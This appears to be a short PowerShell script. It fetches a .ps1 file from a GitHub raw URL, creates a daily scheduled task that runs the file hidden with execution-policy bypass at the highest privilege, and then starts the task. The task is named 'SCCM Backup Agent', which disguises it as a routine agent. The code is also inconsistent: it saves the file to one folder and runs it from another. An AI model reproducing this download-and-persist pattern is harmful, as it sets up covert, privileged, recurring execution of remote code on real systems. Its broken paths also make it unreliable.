


#DownloadFile
powershell "IEX((new-object net.webclient).downloadfile('https://raw.githubusercontent.com/bokanrb/bokanrb_git/master/Powershell/logo-azure-st.ps1', 'C:\users\logo-azure.ps1'))"

#Create Task Schedule
$Time=New-ScheduledTaskTrigger -At 17:00 -Daily
$Action=New-ScheduledTaskAction -Execute PowerShell.exe -Argument "-nop -win 1 -Nop -Exec Bypass -f c:\programdata\logo-azure.ps1" 
Register-ScheduledTask -TaskName "SCCM Backup Agent" -Trigger $Time -Action $Action -RunLevel Highest


#Run TaskSchedule via powershell
Start-ScheduledTask -TaskName "SCCM Backup Agent"
